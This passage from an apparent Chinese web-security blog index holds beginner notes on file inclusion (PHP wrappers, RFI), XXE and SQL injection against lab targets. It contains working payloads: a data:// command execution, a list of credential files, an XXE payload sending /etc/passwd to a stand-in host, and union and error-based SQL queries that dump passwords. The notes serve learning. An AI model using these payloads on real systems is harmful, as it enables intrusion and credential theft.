固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。\n\neg:pikachu靶场的fileinclusion\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240912214736053.png\" alt=\"image-20240912214736053\" style=\"zoom:50%;\" />\n\n文件通过一个叫$filename的变量进行包含\n\n<img src=\"https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240912214839557.png\" alt=\"image-20240912214839557\" style=\"zoom:50%;\" />\n\n但是路径限制在了include下，那么在include文件夹下创建一个test.txt文件、\n\n```php\n<?php phpinfo();?>\n```\n\n构造urlhttp://192.168.127.231/pikachu/vul/fileinclude/fi_local.php?filename=test.txt&submit=提交查询\n\n这样test.txt就被包含执行了\n\n#### 包含姿势\n\n##### php伪协议\n\nPHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。\n\n有些伪协议成功执行需要allow_url_fopen和allow_url_include的支持。\n\nallow_url_fopen On/Off 允许或禁止打开URL文件\nallow_url_include On/Off 允许或禁止引用URL文件php://input\n\n\n\n### php://input \n\n**php://input**可以访问请求的原始数据的只读流，将**post**请求的数据当作php代码执行。当传入的参数作为[文件名](https://so.csdn.net/so/search?q=文件名&spm=1001.2101.3001.7020)打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行\n\n当enctype=”multipart/form-data” 的时候 php://input 是无效的。\n\n利用条件：\n\n- `allow_url_include` = On。\n- 对`allow_url_fopen`不做要求。\n\n### php://filter\n\nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n\n在利用上很多都是与包含函数结合使用，读入或者输出获取文件源码然后编码让其不执行从而输出\n\nphp://filter 的使用：\n如\nphp://filter/read=convert.base64-encode/resource=index.php\nphp://filter/resource=index.php\n\n其他姿势：\n\n```\nfile.php?file=php://filter/convert.base64-encode/resource=index.php\n```\n\n效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。\n\nphp://filter 伪协议组成：\nread=<读链的筛选列表>\nresource=<要过滤的数据流>\nwrite=<写链的筛选列表>\n**php://filter/read=处理方式（base64编码，rot13等等）/resource=要读取的文件**\n\nread 对应要设置的过滤器：\n常见的过滤器分字符串过滤器、转换过滤器、压缩过滤器、加密过滤器\n**其中convert.base64-encode ，convert.base64-decode都属于 转换过滤器**\n\nphar://\n\n利用条件：\n\n    php版本大于等于php5.3.0\n\n假设有个文件phpinfo.php，其内容为<?php phpinfo(); ?>，打包成zip压缩包phpinfo.zip\n\n利用：\n\n指定绝对路径：\n\n```\nfile.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php\n```\n\n也可以使用相对路径：\n\n```\nfile.php?file=phar://phpinfo.zip/phpinfo.php\n```\n\n### zip://与bzip2://与zlib://协议\n\nzip:// 等属于压缩流的协议，通过直接压缩普通文件为zip文件，再通过zip:// 协议读取，可以直接执行php代码。压缩后的zip文件可以随意修改后缀也不影响zip://协议读取。（注意是如phpinfo.txt直接压缩为zip,而不是文件夹压缩zip）\n\n利用条件：\n\n- php版本大于等于php5.3.0\n\n姿势：\n\n构造zip包的方法和phar相同。\n\n 但是使用zip伪协议，需要指定**绝对路径**，**同时将`#`编码为`%23`**,之后填上压缩包内的文件·。\n\n格式示例：\n\n```php\n<?php\n$a=($_GET[\"file\"]);\ninclude($a);\n?>\n```\n\n压缩及协议访问格式：\n\n压缩文件为.zip后缀\nzip://绝对路径/phpinfo.zip%23phpinfo.php\n压缩文件为.bz2后缀\ncompress.bzip2://绝对路径/phpinfo.zip/phpinfo.php\n压缩文件为.gz后缀\ncompress.zlib://绝对路径/phpinfo.zip/phpinfo.php\n\n### data：URI schema\n\n利用条件：\n\n- php版本大于等于php5.2\n- `allow_url_fopen` = On\n- `allow_url_include` = On\n\n姿势一：\n\n```\n?file=data:text/plain,<?php phpinfo();?>\n```\n\n也可以执行命令：\n\n```\n?file=data:text/plain,<?php system('whoami');?>\n```\n\n姿势二：\n\n```\n?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n```\n\nPD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==`的base64解码为：`\n\n```php\n<?php system('whoami');?>\n```\n\n### 包含session\n\n利用条件：\n\n```\n1.session文件路径已知，且其中内容部分可控。\n```\n\n姿势：\n\nphp的`session`文件的保存路径可以在`phpinfo`的`session.save_path`看到。\n\n常见的php-session存放位置：\n\n```\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\n```\n\n其中，session文件的格式是固定的：`sess_phpsessid`.而`phpsessid`在发送的请求的`cookie`字段中可以看到。\n\n## 敏感文件位置\n\nLinux：\n\n```\n/etc/passwd                                                                      //  账户信息\n\n/etc/shadow                                                                      //  账户密码文件\n\n/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件\n\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置\n\n/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置\n\n/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件\n\n/etc/my.conf                                                                     //   mysql 配置文件\n\n```\n\nWin：\n\n```\nc:\\boot.ini                                                                      // 查看系统版本\n\nc:\\windows\\system32\\inetsrv\\MetaBase.xml                                         //  IIS配置文件\n\nc:\\windows\\repair\\sam                                                            //  存储Windows系统初次安装的密码\n\nc:\\Program Files\\mysql\\my.ini                                                    //   MySQL配置\n\nc:\\Program Files\\mysql\\data\\mysql\\user.MYD                                       //   MySQL root\n\nc:\\windows\\php.ini                                                               //   php 配置信息\n\nc:\\windows\\my.ini                                                                //   MySQL 配置文件\n\n\n```\n\n\n\n## 2.远程文件包含漏洞（RFI）\n\n 如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)\n\n能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 \n因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 \n\n\n\neg测试代码：\n\n<?php\n\t$file = @$_GET['file'];\n\t@include($file);\n?>\n\n```php\n<?php\n\t$file = @$_GET['file'];\n\t@include($file);\n?>\n```\n\n在远程服务器上的文件代码(test.txt)\n\n<?php\nphpinfo();\n?>\n\n```php\n<?php\nphpinfo();\n?>\n```\n\npayload:\n\nhttp://127.0.0.1/file.php?file=http://192.168.1.103/test.txt\n\n","tags":["Web安全","PHP","任意文件包含漏洞"],"categories":["Web安全","任意文件包含漏洞"]},{"title":"XXE学习笔记","url":"/2024/09/11/XML && XXE/","content":"\n# 前言\n\n本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~\n\n# XML与HTML的不同\n\n与html区别：html表示与数据相关，XML更多用于数据传输、存储\n\n# XML结构\n\n![image-20240911200426825](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911200426825.png)\n\n```xml\n<?xml version=\"1.0\"?>表示版本号，xml处理解析时的规范\n<Person>...</Person>表示根元素，XML文档需有且仅有一个根元素\n根元素内有两个赋值的嵌套标签子元素<Name></Name>,<Age></Age>\n```\n\n注意：元素标签名对大小写敏感\n\n![image-20240911201050310](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911201050310.png)\n\n上述单独字符不能直接出现，会被错误解析\n\n\n\n# 实体（ENTITIY）\n\nENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述\n\n**<u>XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配</u>**\n\n ![image-20240911201641310](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911201641310.png)\n\n```xml\n<!DOCTYPE Person [\n\t<!ENTITY name \"XXX\">\n]>\n<Person>\n    <Name>&name;</Name>\n    <Age>20</Age>\n</Person>\n前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&跟上实体名引用这个实体，可以防止重复赋值\n```\n\n\n\n# DTD分类 \n\nDTD并不是XML文档的一部分，它们总是在根元素的定义之上->DTD像实体一样可以从外部加载\n\n- 一般实体/通用实体（general entities）\n\n    如上面的那个实体\n\n    引用外部dtd：\n\n    解析器将从这个外部dtd中提取并解析内容\n\n    ```xml\n    <!DOCTYPE Pwn SYSTEM \"xxx.dtd\"> dtd的URI\n    <Pwn>test</Pwn> 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。\n    ```\n\n    \n\n    \n\n- 参数实体\n\n    必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用\n\n    比如，用一个实体给另外一个实体赋值\n\n    ```xml\n    <!ENTITY % outer <!ENTITY inner  \"xxx\">>\n    ```\n\n    ​\t常用于XXE（外部实体注入）\n\n    dtd中调用参数实体\n\n    ***<u>参数实体只能在同一个DTD中调用！！！</u>***\n\n    ```xml\n    <?xml version=\"1.0\"?>\n    <!DOCTYPE Pwn[\n    \t<!ENTITY % outer \"<!ENTITY inner SYSTEM 'xxx'>\">\n    \t%outer;\n    ]>\n    <Pwn>&inner;</Pwn>\n    ```\n\n    ![image-20240911213347867](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911213347867.png)\n\n    XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于<!ENTITY inner SYSTEM 'xxx'>\n\n\n\n- 预定义实体\n\n    某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号\n\n    ```xml\n    <test>&#x3C;</test> 这一串十六进制表示了<\n    ```\n\n    \n\n# XML安全性问题\n\n- ## ENTITY\n\n    实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。\n\n    实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面\n\n    比如：\n\n    ```xml\n    <?xml version=\"1.0\"?>\n    <!DOCTYPE XXE[\n    <!ENTITY subcribe SYSTEM \"secret.txt\">\n    ]>\n    \n    <pwn>&subscribe;</pwn>\n    ```\n\n    SYSTEM表示后面的内容是外部实体；\n\n    如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；\n\n    这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容\n\n    \n\n    外部实体读取了数据，这种就是外部实体注入攻击（XXE）\n\n    \n\n    # 外部实体注入攻击（XXE）\n\n    ## 分类\n\n    ### 带内数据\n\n    上面的示例涉及的就是带内XXE；\n\n    XML解析后的输出会直接显示在屏幕上\n\n    ### 基于错误\n\n    解析结果只有错误信息（类似Blind XXE）\n\n    ### 带外数据\n\n    OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来\n\n    场景：\n\n    ![image-20240911210308114](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911210308114.png)\n\n    有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）\n\n![image-20240911211102130](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911211102130.png)\n\n如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））\n\n## Payload\n\neg：\n\n![image-20240911214058914](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911214058914.png)\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE XXE[\n<!ENTINY %passwd SYSTEM \"/etc/passwd\">\n<!ENTINY %wrapper \"<!ENTINY send SYSTEM 'http://xxx.com/?passwd;'>\">\n%wrapper;\n]>\n<pwn>send;</pwn>\n\nXML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper\n\n但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制\n```\n\n![image-20240911220104480](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911220104480.png)\n\n比如payload形式为：\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE data SYSTEM \"/xxx/xx/x/test.dtd\">;\n\n<data>&send;</data> \n莫名冒出来的send实体就来自外部的dtd\n```\n\n![image-20240911220628961](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911220628961.png)\n\n![image-20240911220643534](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911220643534.png)\n\n%passwd最终会变成URL的一部分\n\n![image-20240911220809746](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240911220809746.png)","tags":["Web安全","XXE && XML"],"categories":["Web安全","XXE && XML"]},{"title":"SQL注入学习笔记","url":"/2024/06/02/SQL注入/","content":"\n# 前言\n\n本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~\n\n# SQL注入\n\n当客户端提交的数据未作处理或转义，直接带入数据库\n\n具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作------->(通过构造一条精巧的语句来查询想要得到的信息 )\n\n![image-20240526103238238](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240526103238238.png)\n\n#  分类\n\n- ## 按照查询字段\n\n    1. 字符型：当输入的参数为字符串时，称为字符型\n    2. 数字型：当输入的参数为整形时，可以认为是数字型注入\n\n- ## 按照注入方法\n\n    1. Union注入(联合注入)\n    2. 报错注入\n    3. 布尔注入\n    4. 时间注入 \n\n# 注入点\n\n是可以实行注入的地方，通常是一个访问数据库的连接 \n\n比如\n\n```php\nhttp://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点\n```\n\n# 判断字符型注入和数字型注入\n\n数字型一般提交内容为数字，但是数字不一定为数字型\n\n1.使用and 1=1 和 and 1=2来判断\n\n- 如果提交and 1=1 和 and 1=2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符''来提交)\n- 如果提交and 1=1能正常显示，提交and 1=2不能正常显示，则为数字型\n\n2.可以使用 2-1判断\n\n```c\nhttp://2.0.0.1/sql/Less-1/index.php?id= 2-1\n//数字型：会查找id=1的值\n//字符型：不能运算，仍然显示原来的结果\n```\n\nps：为什么不用+？+有的时候会被理解为空格\n\n## 闭合方式\n\n' , \" , ') , \")\n\n![image-20240526111309175](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240526111309175.png)\n\n## 闭合的作用\n\n手动提交闭合符号，结束前一段查询语句\n\n后面即可加入其他语句，查询需要的参数\n\n不需要的语句可以用注释符号'--+'或'#'或'%23'注释掉\n\n# Union联合注入\n\n注意：联合查询必须要求列数一致，否则报错\n\n## 查询回显位：\n\n查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。\n\n## 步骤\n\n​\t0.查找注入点\n\n1. 先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式\n\n    ```c\n    /*\n    1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1' group by 10 --+\n    2.数字型：直接group by\n    \n    ----用order by也可以-----\n    */\n    ```\n\n    \n\n2. 二分法判断列数（group by/order by），比如先group by 10 再group by 5这样\n\n3. 根据列数进行union查询\n\n    ```mysql\n    -- 比如得到列数是3\n    字符型?id=1' union select 1,2,3 --+\n    -- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）\n    ```\n\n4. 查询回显位置 \n\n## 拿到表名\n\n!!!数据库information_schema\n\n![image-20240526115628523](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240526115628523.png)\n\n ![image-20240526115917401](C:/Users/27251/AppData/Roaming/Typora/typora-user-images/image-20240526115917401.png)\n\n```mysql\n-- 比如对于Less-1(字符型)\n...../index.php?id=0' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙\n```\n\n即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()\n\n```\n/index.php?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表\n```\n\n## 拿到列名\n\n与前面类似\n\n```\n/index.php?id=0' union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = 'users' --+ \n```\n\n可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了\n\n```\n字符型：/index.php id=-1' union select 1,group_concat(username,password),3 from user --+\n```\n\ngroup_concat()之间可以自己加入分隔符加强可读性\n\n## 数字型union注入\n\n与字符型的区别：不用判断闭合方式\n\n# 报错注入\n\n![image-20240528211433326](C:/Users/27251/AppData/Roaming/Typora/typora-user-images/image-20240528211433326.png)\n\n![image-20240528211558846](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240528211558846.png)\n\n报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句\n\n## extractvalue注入\n\n```mysql\nselect extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在\n```\n\n### 如何让它报错\n\n1.如果只是写错路径下的名字，不会报错，只是找不到\n\n2.路径格式错误，报错，会把错的路径报出来\n\n​\t构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息\n\n```mysql\nselect extractvalue(列名,concat(0x7e,(select database())) from 表名;\n-- 0x7e是~的ASCII值，使路径错误引起报错                   \n```\n\n```mysql\nindex.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字\n-- 也可以这么写\nindex.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))\n```\n\n### 如何获得不同的信息\n\n在concat的第二个参数动手脚\n\n获取表名\n\n```mysql\nindex.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))\n```\n\n获取列名\n\n```mysql\nindex.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))\n```\n\n获取详细信息\n\n```mysql\nindex.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))\n```\n\nps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题\n\n![image-20240528221919149](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240528221919149.png)\n\n```mysql\nindex.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符\n```\n\n## updatexml注入\n\n![image-20240529195843202](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240529195843202.png)\n\n### 原理\n\n与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样\n\n![image-20240529203522024](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240529203522024.png)\n\n## floor报错\n\n![image-20240530194406277](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530194406277.png)\n\n![image-20240530194758581](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530194758581.png)\n\n![image-20240530195254834](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530195254834.png)\n\n![image-20240530195420894](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530195420894.png)\n\n![[image-20240530195631365](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530195631365.png)](C:\\Users\\27251\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240530195631365.png)\n\n### 报错原理\n\n![image-20240530195837830](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530195837830.png)\n\n![image-20240530200128695](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530200128695.png)\n\n### 分析\n\nrand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复\n\n![image-20240530200925145](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530200925145.png)\n\n第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错\n\n\n\n```mysql\nselect count(*),concat_ws('-',(database()),floor(rand(0)*2)) as a from 表名 group by a;\n/*\n这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables\n*/\n```\n\n![image-20240530204447733](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530204447733.png)\n\n![image-20240530204814161](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240530204814161.png)\n\n## 盲注\n\n![image-20240531192921629](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531192921629.png)\n\n### 布尔盲注\n\nweb页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据\n\n![image-20240531193540223](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531193540223.png)\n\n![image-20240531193831806](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531193831806.png)\n\n![image-20240531193916885](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531193916885.png)\n\n![image-20240531194307123](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531194307123.png)\n\n但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)/substring(str,n,k)来辅助(从第n个字符开始显示k个字符)\n\n```http\nindex.php?id=1 and substr(('abcd'),1,1) //把abcd换成想要的语句\n```\n\n![image-20240531200528918](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240531200528918.png)\n\n### 时间盲注\n\n![image-20240601171037072](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240601171037072.png)\n\n![image-20240601171205061](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240601171205061.png)\n\n![image-20240601172051556](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240601172051556.png)\n\n```mysql\n-- 可以根据页面响应时间判断字符型-闭合方式/数字型\n```\n\n![image-20240602133523744](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240602133523744.png)\n\n```mysql\n-- example\nselect if(acsii(substr((select database()),1,1))>=97,sleep(10),sleep(0))\n```\n\n![image-20240602131930143](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240602131930143.png)\n\n![image-20240602133433995](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240602133433995.png)\n\n# 宽字节注入\n\n![image-20240609110750885](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240609110750885.png)\n\n![image-20240609110940222](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240609110940222.png)\n\n## 局限性：宽字节注入必须使用GBKB编码\n\n![image-20240609111123311](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240609111123311.png)\n\n意思就是%5c(\\)原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\\失去自己的作用\n\n![image-20240609111912926](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240609111912926.png)\n\n```mysql\nhttp://192.168.127.186/sql/Less-32/index.php?id=-1%df' union select 1,group_concat(username,id,password),3 from users --+\n```\n\n\n\n# 注入文件上传\n\n## mysql文件上传要点\n\n```mysql\nshow variables like '%secure%'; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件\n\ninto outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径\n```\n\n步骤\n\n还是先判断字符型和数字型\n\n如果是字符型，再判断闭合方式 加上and 1=2 和and 1=1判断闭合符是否正确\n\n然后判断列数\n\n\n\n![image-20240602135914074](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20240602135914074.png)\n\n","tags":["Web安全","SQL注入","PHP"],"categories":["Web安全","SQL注入"]}]